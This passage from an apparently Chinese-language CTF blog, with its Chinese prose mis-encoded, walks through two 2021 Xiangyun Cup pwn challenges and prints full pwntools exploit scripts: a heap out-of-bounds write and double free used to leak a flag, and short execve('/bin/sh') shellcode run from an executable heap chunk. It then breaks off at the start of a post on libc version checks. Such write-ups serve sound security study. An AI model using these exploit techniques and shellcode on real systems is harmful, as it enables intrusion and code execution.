src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908144332803.png" alt="image-20210908144332803"></p><p>æ³„éœ²å‡ºçš„åœ°å€ï¼Œè·ç¦»flagçš„åœ°å€åç§»ä¸º0x40ï¼Œç„¶åè¿™è¾¹ä¸ºå¯¹é½ï¼Œå†åŠ ä¸Šäº†0x1000ï¼Œå¼„æˆä¸¤å­—èŠ‚åœ°å€</p><p>è®¤çœŸè§‚å¯Ÿï¼Œæ‰€æœ‰çš„èœå•åŠŸèƒ½é‡Œé¢éƒ½æ²¡æœ‰æ£€æŸ¥ç´¢å¼•çš„ä¸‹é™ï¼Œåªæ˜¯è§„å®šäº†ä¸èƒ½å¤§äº3ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å †ç»“æ„çš„æ•°ç»„è¿›è¡Œè¶Šç•Œï¼Œå¯»æ‰¾åˆ°ä¹‹å‰ä¿å­˜åœ¨.bssä¸Šçš„æ ˆåœ°å€ï¼Œå†å€Ÿç”¨ä¿®æ”¹åŠŸèƒ½å¯¹æ ˆç©ºé—´è¿›è¡Œä¿®æ”¹ï¼Œé€šè¿‡éƒ¨åˆ†è¦†ç›–å°†ç¯å¢ƒå˜é‡çš„ä¸€ä¸ªæŒ‡é’ˆæ”¹ä¸ºflagçš„åœ°å€ï¼Œä¹‹åç ´åå †ç»“æ„ï¼ŒæŠ¥é”™å³å¯æ³„éœ²å‡ºflag</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151510913.png" alt="image-20210908151510913"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151525386.png" alt="image-20210908151525386"></p><p>è¦è¶Šç•Œåˆ°0x202060ï¼Œä¹Ÿå°±æ˜¯æ•°ç»„ä¸‹æ ‡å€¼ä¸º-260</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908163406979.png" alt="image-20210908163406979"></p><p>è¿˜è®°å¾—å‰é¢ç»•è¿‡éšæœºæ•°ï¼Œå¯ä»¥è¾“å…¥çš„åå­—å—ï¼Ÿåˆšå¥½ï¼Œå‰å››ä¸ªå­—èŠ‚ä¼ªé€ sizeï¼Œå•ç‹¬ä¸€ä¸ªå­—èŠ‚èƒ½ä¼ªé€ å †çš„flagï¼Œæ‰€ä»¥æˆ‘ä»¬å°±èƒ½å¯¹.bssä¸Šçš„æ ˆåœ°å€å†™å…¥0x2000é•¿åº¦çš„æ•°æ®</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908164508706.png" alt="image-20210908164508706"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908165054261.png" alt="image-20210908165054261"></p><p>ç›®çš„æ˜¯ä¸ºäº†ä¿®æ”¹æ ˆä¸Šçš„ä¸€ä¸ªç¯å¢ƒæŒ‡é’ˆï¼Œç„¶åæˆ‘å‘ç°ï¼Œwpé‡Œé¢å¹¶æ²¡æœ‰è¦†ç›–åˆ°æˆ‘è¿™çš„ç¯å¢ƒæŒ‡é’ˆï¼Œè¿˜å·®å…«ä¸ªå­—èŠ‚ï¼Œä¿®æ”¹ä¸º<code>&#39;a&#39;*0x140</code>ï¼Œå¦‚ä¸Šå›¾ï¼Œä¿®æ”¹æˆåŠŸäº†</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230006730.png" alt="image-20210909230006730"></p><p>ç”±äºæ˜¯æœ¬åœ°è°ƒè¯•ï¼Œæˆ‘ç›´æ¥ä¸çˆ†ç ´äº†ï¼Œè½¬ä¸ºæ‰‹åŠ¨è¾“å…¥ï¼Œæ‰€ä»¥ä¿®æ”¹æˆåŠŸ</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230112342.png" alt="image-20210909230112342"></p><p>è¿™é‡Œæ˜¯ä¼ªé€ ä¸€ä¸ªå †å¤´ï¼Œåé¢æ˜¯è¦è®©å †å—ç”³è¯·åˆ°è¿™é‡Œï¼Œä½†æ˜¯å¤§å°å´ä¸æ˜¯0x450ï¼Œå¯¼è‡´æŠ¥é”™é€€å‡ºï¼Œæ‰“å°flag</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230229164.png" alt="image-20210909230229164"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230215738.png" alt="image-20210909230215738"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230529823.png" alt="image-20210909230529823"></p><p>è¿™è¾¹å¤šæçš„æ˜¯å› ä¸ºåœ¨ç”³è¯·å †å—åŠŸèƒ½é‡Œé¢ï¼Œå¦‚æœç¬¬äºŒä¸ªå †å—ç”³è¯·å¤§äº0x400ï¼Œå°†ä¼šç›´æ¥freeå‰é¢çš„ï¼Œä½†æ˜¯æŒ‡é’ˆå´æ²¡æœ‰æ¸…é›¶ï¼Œæ‰€ä»¥å€Ÿç”¨è¿™ä¸ªï¼Œå¯ä»¥é€ æˆdouble freeï¼Œæœ€ç»ˆå¯¼è‡´chunk dupï¼Œæ‰€ä»¥å°±å¯ä»¥ä¿®æ”¹ä¸€ä¸ªå­—èŠ‚ï¼Œä»è€Œç”³è¯·åˆ°æˆ‘ä»¬å‰é¢å¸ƒç½®å¥½çš„ä¼ªé€ å †å—ä¸Šï¼Œä½†æ˜¯æˆ‘æœ¬åœ°æ˜¯æ²¡æœ‰æ‰“å°å‡ºflagçš„ï¼Œå…·ä½“åŸå› ä¸çŸ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./lemon_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,name,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>p.send(name)<br>p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Leave your message:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add2</span>(<span class="hljs-params">idx,name,size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>p.send(name)<br>p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon  :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;draw and color!&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>p.sendafter(<span class="hljs-string">&quot;game with me?\n&quot;</span>,<span class="hljs-string">&quot;yes&quot;</span>)<br>p.sendafter(<span class="hljs-string">&quot;number: \n&quot;</span>,<span class="hljs-string">&#x27;111111&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&quot;first: \n&quot;</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x2000</span>) + p8(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>low = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">3</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>debug()<br>a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;æ‰¾åˆ°çˆ†ç ´å­—èŠ‚&quot;</span>) <br>flag_low = low - <span class="hljs-number">0x40</span> + a<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x140</span> + p8(flag_low &amp; <span class="hljs-number">0xff</span>) + p8((flag_low &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>) <span class="hljs-comment">##è¦†ç›–ç¯å¢ƒå˜é‡çš„ä½ç½®</span><br>edit(-<span class="hljs-number">260</span>,payload)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x500</span>)<br>free(<span class="hljs-number">0</span>)<br>payload = p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x450</span>) + p64(<span class="hljs-number">0x100000020</span>) + p64(<span class="hljs-number">0x0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x01\x01&#x27;</span>,<span class="hljs-number">0x20</span>,payload)<br>    free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>)<br>add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>)<br>pwn()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">while True:</span><br><span class="hljs-string">try:</span><br><span class="hljs-string">p = process(&quot;./lemon_pwn&quot;)</span><br><span class="hljs-string">pwn()</span><br><span class="hljs-string">aaa = (&quot;or corruption (!prev):&quot;)</span><br><span class="hljs-string">print aaa</span><br><span class="hljs-string">if &quot;flag&quot; in aaa:</span><br><span class="hljs-string">pause()</span><br><span class="hljs-string">except:</span><br><span class="hljs-string">p.close()</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="JigSawâ€™sCage"><a href="#JigSawâ€™sCage" class="headerlink" title="JigSawâ€™sCage"></a>JigSawâ€™sCage</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090309078.png" alt="image-20210921090309078"></p><p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090356101.png" alt="image-20210921090356101"></p><p>è¿™é‡Œçš„choiceæ˜¯intç±»å‹ï¼Œè€Œè¾“å…¥å´æ˜¯å¯ä»¥è¾“å…¥8å­—èŠ‚é•¿åº¦çš„æ•°æ®ï¼Œè€Œv2å°±æ˜¯choiceç›¸é‚»çš„é«˜32ä½çš„æ•°æ®ï¼Œè¦†ç›–v2å¤§äº14ä¼šå¾—åˆ°ä¸€å—å¯ä»¥æ‰§è¡Œçš„å †å†…å­˜</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090223446.png" alt="image-20210921090223446"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå †å—å¯æ‰§è¡Œäº†</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090636446.png" alt="image-20210921090636446"></p><p>å¹¶ä¸”å­˜åœ¨ç€åŠŸèƒ½ï¼Œæ˜¯å¯ä»¥æ‰§è¡Œå †å—çš„ï¼Œæ‰€ä»¥å¯ä»¥å¾€å †å—ä¸Šå†™shellcode</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090735583.png" alt="image-20210921090735583"></p><p>ä½†æ˜¯ï¼Œå †å—åªèƒ½ç”Ÿæˆ0x10çš„å †å—ï¼Œæ‰€ä»¥ç›´æ¥å†™å…¥å¯ä»¥getshellçš„shellcodeé•¿åº¦æ˜¯è‚¯å®šä¸å¤Ÿçš„ï¼Œè‡³å°‘è¦äºŒåå¤šä¸ªå­—èŠ‚é•¿åº¦æ‰è¡Œï¼Œæ‰€ä»¥è¿™æ—¶å€™ä¸€èˆ¬å¯ä»¥å…ˆçœ‹çœ‹å¯„å­˜å™¨æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨çš„è„æ•°æ®ï¼Œå‡å°‘shellcodeä¹¦å†™çš„é•¿åº¦</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095449264.png" alt="image-20210921095449264"></p><p>æ–­ç‚¹ä¸‹åœ¨testå‡½æ•°è¦æ‰§è¡Œå †å—å†…å®¹çš„é‚£æ­¥ï¼ŒæŸ¥çœ‹åœ¨è¿™æ—¶å¯„å­˜å™¨å­˜äº†å“ªäº›è„æ•°æ®</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095610649.png" alt="image-20210921095610649"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100019587.png" alt="image-20210921100019587"></p><p>èƒ½å‘ç°ï¼ŒR10ä¿å­˜çš„æ˜¯ä¸€ä¸ªlibcä¸Šçš„åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥å€Ÿç”¨è¿™ä¸ªå€¼å»è®¡ç®—free_hookä»¥åŠsystemçš„å€¼ï¼Œç„¶åå†æ‰¾ä¸ªå¯„å­˜å™¨ï¼Œè¿›è¡Œä¸¤æ¬¡æ‰§è¡Œæ“ä½œï¼ŒæŠŠsystemå†™å…¥free_hookä¸­ï¼Œç„¶åé‡Šæ”¾ä¸€å—å†™æœ‰â€™/bin/shâ€™çš„å †å—å³å¯</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100059193.png" alt="image-20210921100059193"></p><p>å¦å¤–ä¸€ç§shellcodeå°±æ˜¯ç›´æ¥getshellï¼Œéœ€è¦æ›´å¤šçš„è§‚å¯Ÿ</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101332945.png" alt="image-20210921101332945"></p><p>å¯ä»¥å‘ç°ï¼ŒRDXé‡Œé¢çš„å€¼æ˜¯å †ä¸Šçš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾€å †ä¸Šå†™å…¥/bin/sh\x00ï¼Œç„¶åå†è®¡ç®—åç§»ï¼Œä¼ å…¥RDIï¼Œå†å°†RDXæ¸…é›¶ï¼ŒæŠŠ59ä¼ å…¥alï¼Œæœ€åç³»ç»Ÿè°ƒç”¨å³å¯ï¼Œä½†æ˜¯å› ä¸ºé•¿åº¦æœ‰é™ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å®šè¦æ³¨æ„</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101858450.png" alt="image-20210921101858450"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101917761.png" alt="image-20210921101917761"></p><p>åŒæ ·getshelll</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./JigSAW&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;iNput:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execve</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Name:\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Make your Choice:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1095216660480&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">code1 = asm(&quot;add r10, 0x50068; mov r12, r10;&quot;)</span><br><span class="hljs-string">code2 = asm(&quot;sub r10, 0x1496b0; mov qword ptr [r12], r10&quot;)</span><br><span class="hljs-string">add(0)</span><br><span class="hljs-string">add(1)</span><br><span class="hljs-string">add(2)</span><br><span class="hljs-string">edit(0,code1)</span><br><span class="hljs-string">edit(1,code2)</span><br><span class="hljs-string">edit(2,&#x27;/bin/sh\x00&#x27;)</span><br><span class="hljs-string">debug()</span><br><span class="hljs-string">execve(0)</span><br><span class="hljs-string">execve(1)</span><br><span class="hljs-string">free(2)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">add dl,0x20;</span><br><span class="hljs-string">push rsi;</span><br><span class="hljs-string">pop rdi;</span><br><span class="hljs-string">xchg rdi,rdx;</span><br><span class="hljs-string">push rsi;</span><br><span class="hljs-string">pop rax;</span><br><span class="hljs-string">mov al,59;ls</span><br><span class="hljs-string">syscall;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br>add(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>debug()<br>execve(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»¥ä¸‹æ˜¯æˆ‘æ ¹æ®å¤§ä½¬çš„wpä¸€ç‚¹ç‚¹å¤ç°çš„ï¼Œæ¯”èµ›æ—¶ï¼Œå¤ªèœäº†ï¼Œéƒ½æ²¡åšå‡ºæ¥ã€‚ä¸‹é¢ä¸¤ä¸ªé“¾æ¥æ˜¯å¤§ä½¬çš„wp&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/402722060&quot;&gt;https://zhuanlan.zhihu.com/p/4027220</summary>
      
    
    
    
    
    <category term="ç¥¥äº‘æ¯PWN" scheme="http://example.com/tags/%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/"/>
    
  </entry>
  
  <entry>
    <title>libcç‰ˆæœ¬æ£€æŸ¥æœºåˆ¶</title>
    <link href="http://example.com/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/</id>
    <published>2021-08-30T08:28:47.000Z</published>
    <updated>2021-10-13T08:01:22.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬ç¯‡æœ¬ç« æ˜¯ä»¥libc-2.23.soä¸ºåŸºç¡€ï¼Œå»å¯¹æ¯”ä¹‹åç‰ˆæœ¬çš„å·®å¼‚é—®é¢˜</p><h2 id="libc-2-23-so"><a href="#libc-2-23-so" class="headerlink" title="libc-2.23.so"></a>libc-2.23.so</h2><h3 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h3><p>tcacheæ˜¯åœ¨libc-2.27.soå¼•è¿›çš„ä¸€ç§æ–°æœºåˆ¶</p><h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a><strong>tcache_entry</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span 